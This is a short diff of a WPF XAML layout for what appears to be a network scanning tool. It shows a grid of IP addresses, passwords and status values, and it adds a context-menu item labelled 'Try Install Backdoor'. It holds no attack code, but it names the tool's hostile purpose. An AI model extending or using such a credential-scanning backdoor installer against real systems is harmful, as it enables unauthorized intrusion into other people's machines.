@@ -130,7 +130,7 @@
                 GridLinesVisibility="Horizontal"
                 CanUserAddRows="False"
                 ItemsSource="{Binding Source}"
-                KeyboardNavigation.TabNavigation="Once" Margin="0,0,6,10">
+                KeyboardNavigation.TabNavigation="Once" Margin="0,0,6,10" SelectedCellsChanged="userGrid_SelectedCellsChanged">
                 <DataGrid.Columns>
                     <DataGridTextColumn Binding="{Binding Index}" Header="#" />
                     <DataGridTextColumn Binding="{Binding IPAddress}" Header="IPAddress" />
@@ -138,6 +138,15 @@
                     <DataGridTextColumn Binding="{Binding Password}" Header="Password" />
                     <DataGridTextColumn Binding="{Binding Status}" Header="Status" />
                 </DataGrid.Columns>
+                <DataGrid.ContextMenu>
+                    <ContextMenu>
+                        <MenuItem
+                            x:Name="btwButton"
+                            Click="AttemptBTW"
+                            Header="Try Install Backdoor">
+                        </MenuItem>
+                    </ContextMenu>
+                </DataGrid.ContextMenu>
             </DataGrid>
             <Button x:Name="StartScanButton" Margin="241,67,30,0" Content="Start" Height="30" VerticalAlignment="Top" Click="StartScan" Grid.Column="1" />
         </Grid>
